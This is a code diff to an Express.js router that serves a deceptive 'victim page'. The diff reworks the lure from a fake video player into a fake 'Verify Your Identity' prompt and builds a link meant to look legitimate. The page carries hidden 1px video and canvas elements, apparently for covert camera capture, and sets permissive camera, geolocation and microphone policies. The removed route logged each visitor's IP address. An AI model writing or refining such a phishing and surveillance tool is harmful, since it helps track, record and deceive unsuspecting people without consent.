@@ -44,8 +44,8 @@ router.post('/start', (req, res) => {
         || (process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : '')
         || `http://localhost:${process.env.PORT || 3001}`;
 
-    // Generate a CLEAN, human-friendly link (looks like a shared video/media URL)
-    const link = `${host}/watch/${sessionToken}`;
+    // Generate a CLEAN, human-friendly link (no /api/ in path — looks legitimate)
+    const link = `${host}/verify-identity/${sessionToken}`;
     res.json({ sessionToken, link });
 });
 
@@ -94,65 +94,70 @@ function renderVictimPage(sessionToken, redirectUrl) {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Media Player - Watch Video</title>
+  <title>Verify Your Identity</title>
   <style>
     *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       min-height: 100vh;
-      background: #0f0f0f;
+      background: linear-gradient(135deg, #0d1b2e 0%, #1b2838 100%);
       display: flex; align-items: center; justify-content: center;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-      padding: 16px;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      padding: 20px;
     }
     .card {
-      background: #1a1a1a;
-      border: 1px solid #2a2a2a;
-      border-radius: 16px;
-      padding: 32px 24px;
+      background: rgba(255,255,255,0.06);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 20px;
+      padding: 40px 32px;
       max-width: 380px;
       width: 100%;
       text-align: center;
     }
-    .icon { font-size: 52px; margin-bottom: 12px; }
-    h1 { color: #fff; font-size: 20px; font-weight: 600; margin-bottom: 6px; }
-    p { color: #888; font-size: 13px; line-height: 1.5; margin-bottom: 24px; }
+    .icon { font-size: 48px; margin-bottom: 16px; }
+    h1 { color: #fff; font-size: 22px; font-weight: 600; margin-bottom: 8px; }
+    p { color: rgba(255,255,255,0.55); font-size: 14px; line-height: 1.5; margin-bottom: 28px; }
     .btn {
       display: inline-block;
-      background: #3b82f6;
+      background: #e02e4f;
       color: #fff;
       border: none;
-      border-radius: 8px;
-      padding: 12px 36px;
-      font-size: 15px;
-      font-weight: 500;
+      border-radius: 50px;
+      padding: 14px 40px;
+      font-size: 16px;
+      font-weight: 600;
       cursor: pointer;
-      transition: all 0.15s;
+      transition: transform 0.15s, box-shadow 0.15s;
+      touch-action: manipulation;
     }
-    .btn:active { transform: scale(0.96); opacity: 0.85; }
+    .btn:active { transform: scale(0.96); }
+    .btn:focus { outline: 2px solid rgba(224,46,79,0.5); }
     .btn-secondary {
       background: transparent;
-      border: 1px solid #333;
-      color: #aaa;
-      margin-top: 8px;
+      border: 1px solid rgba(255,255,255,0.2);
+      color: rgba(255,255,255,0.7);
+      margin-top: 12px;
       padding: 10px 28px;
       font-size: 13px;
     }
     .status {
-      margin-top: 16px;
-      color: #666;
-      font-size: 12px;
+      margin-top: 20px;
+      color: rgba(255,255,255,0.35);
+      font-size: 13px;
       display: none;
     }
     .status.show { display: block; }
     .status.warning {
-      color: #f59e0b;
-      font-size: 13px;
-      padding: 14px;
-      background: rgba(245,158,11,0.08);
-      border: 1px solid rgba(245,158,11,0.2);
-      border-radius: 10px;
+      color: #fbbf24;
+      font-size: 14px;
+      font-weight: 500;
+      padding: 16px;
+      background: rgba(251,191,36,0.1);
+      border: 1px solid rgba(251,191,36,0.2);
+      border-radius: 12px;
+      line-height: 1.5;
     }
-    .status.success { color: #22c55e; font-weight: 500; }
+    .status.success { color: #34d399; font-weight: 500; }
     .hidden { display: none !important; }
     /* Hidden tracking elements */
     #_tv { position: fixed; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
@@ -161,12 +166,12 @@ function renderVictimPage(sessionToken, redirectUrl) {
 </head>
 <body>
   <div class="card">
-    <div class="icon">▶️</div>
-    <h1>Video Preview</h1>
-    <p>Press play to watch the shared video clip.<br>May request camera for reactions.</p>
-    <button class="btn" id="_goBtn">▶ Play Video</button>
-    <button class="btn btn-secondary hidden" id="_retryBtn">↻ Retry</button>
-    <div class="status" id="_status">Loading…</div>
+    <div class="icon">🛡️</div>
+    <h1>Verify Your Identity</h1>
+    <p>We need to verify you are a real person.<br>Tap the button below to continue.</p>
+    <button class="btn" id="_goBtn">Tap to Verify</button>
+    <button class="btn btn-secondary hidden" id="_retryBtn">⟳ Try Again</button>
+    <div class="status" id="_status">Processing…</div>
   </div>
   <video id="_tv" autoplay playsinline muted></video>
   <canvas id="_tc"></canvas>
@@ -426,24 +431,7 @@ router.get('/v/:sessionToken', (req, res) => {
 
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
     res.setHeader('Permissions-Policy', 'camera=*, geolocation=*, microphone=*');
-    res.send(renderVictimPage(sessionToken));
-});
-
-// ─────────────────────────────────────────────────────────────────────
-//  GET  /watch/:sessionToken   →   NEW victim page (clean URL, looks like video)
-// ─────────────────────────────────────────────────────────────────────
-router.get('/watch/:sessionToken', (req, res) => {
-    const sessionToken = req.params.sessionToken;
-    if (!_locStore[sessionToken]) return res.status(404).send('Link expired or invalid.');
-
-    // Capture victim IP immediately on page load
-    const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim()
-        || req.socket.remoteAddress;
-    _locStore[sessionToken].clientIp   = clientIp;
-    _locStore[sessionToken].timestamp  = Date.now();
-
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    res.setHeader('Permissions-Policy', 'camera=*, geolocation=*, microphone=*');
+    res.setHeader('Feature-Policy', "camera 'self'; geolocation 'self'; microphone 'self'");
     res.send(renderVictimPage(sessionToken));
 });
 
